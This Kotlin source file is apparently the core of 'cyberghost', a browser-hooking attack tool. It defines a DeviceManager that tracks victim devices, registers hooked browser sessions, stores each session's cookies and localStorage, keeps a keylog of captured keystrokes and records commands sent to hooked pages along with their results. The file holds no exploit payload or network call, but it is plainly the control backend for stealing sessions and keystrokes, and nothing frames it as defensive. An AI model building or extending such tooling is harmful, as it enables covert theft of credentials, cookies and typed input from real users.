package com.cyberghost.core

import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import java.time.Instant
import java.util.concurrent.ConcurrentHashMap

data class ConnectedDevice(
    val ip: String,
    val mac: String? = null,
    var hostname: String? = null,
    var userAgent: String? = null,
    val firstSeen: Instant = Instant.now(),
    var lastSeen: Instant = Instant.now(),
    var requestCount: Long = 0,
    var bytesTransferred: Long = 0,
    val hookedSessions: MutableList<HookedSession> = mutableListOf()
) {
    val isHooked: Boolean get() = hookedSessions.any { it.isAlive }
}

data class HookedSession(
    val sessionId: String, val pageUrl: String, val userAgent: String,
    val platform: String, val screenSize: String, val language: String,
    val cookies: String, val localStorage: Map<String, String>,
    val connectedAt: Instant = Instant.now(), var lastPing: Instant = Instant.now(),
    var isAlive: Boolean = true,
    val keylog: MutableList<KeyEvent> = mutableListOf(),
    val commandHistory: MutableList<CommandRecord> = mutableListOf()
)

data class KeyEvent(val key: String, val code: String, val target: String, val timestamp: Long)
data class CommandRecord(val id: String, val action: String, val sentAt: Instant, var result: String? = null, var error: String? = null)

class DeviceManager {
    private val devices = ConcurrentHashMap<String, ConnectedDevice>()
    private val sessions = ConcurrentHashMap<String, HookedSession>()
    private val _deviceList = MutableStateFlow<List<ConnectedDevice>>(emptyList())
    val deviceList: StateFlow<List<ConnectedDevice>> = _deviceList

    fun trackRequest(ip: String, userAgent: String?, bytes: Long) {
        val device = devices.getOrPut(ip) { ConnectedDevice(ip = ip) }
        device.lastSeen = Instant.now(); device.requestCount++; device.bytesTransferred += bytes
        if (userAgent != null) device.userAgent = userAgent; refreshList()
    }

    fun registerHook(ip: String, sessionId: String, pageUrl: String, userAgent: String, platform: String, screenSize: String, language: String, cookies: String, localStorage: Map<String, String>): HookedSession {
        val session = HookedSession(sessionId = sessionId, pageUrl = pageUrl, userAgent = userAgent, platform = platform, screenSize = screenSize, language = language, cookies = cookies, localStorage = localStorage)
        sessions[sessionId] = session
        val device = devices.getOrPut(ip) { ConnectedDevice(ip = ip) }
        device.userAgent = userAgent
        if (!device.hookedSessions.any { it.sessionId == sessionId }) device.hookedSessions.add(session)
        refreshList(); return session
    }

    fun getSession(sessionId: String): HookedSession? = sessions[sessionId]
    fun getDevice(ip: String): ConnectedDevice? = devices[ip]
    fun markDisconnected(sessionId: String) { sessions[sessionId]?.isAlive = false; refreshList() }
    fun appendKeylog(sessionId: String, keys: List<KeyEvent>) { sessions[sessionId]?.keylog?.addAll(keys) }
    fun recordCommand(sessionId: String, record: CommandRecord) { sessions[sessionId]?.commandHistory?.add(record) }
    fun updateCommandResult(sessionId: String, commandId: String, result: String?, error: String?) {
        sessions[sessionId]?.commandHistory?.find { it.id == commandId }?.apply { this.result = result; this.error = error }
    }
    fun getAllDevices(): List<ConnectedDevice> = devices.values.toList().sortedByDescending { it.lastSeen }
    fun getHookedSessions(): List<HookedSession> = sessions.values.filter { it.isAlive }
    private fun refreshList() { _deviceList.value = devices.values.toList().sortedByDescending { it.lastSeen } }
}
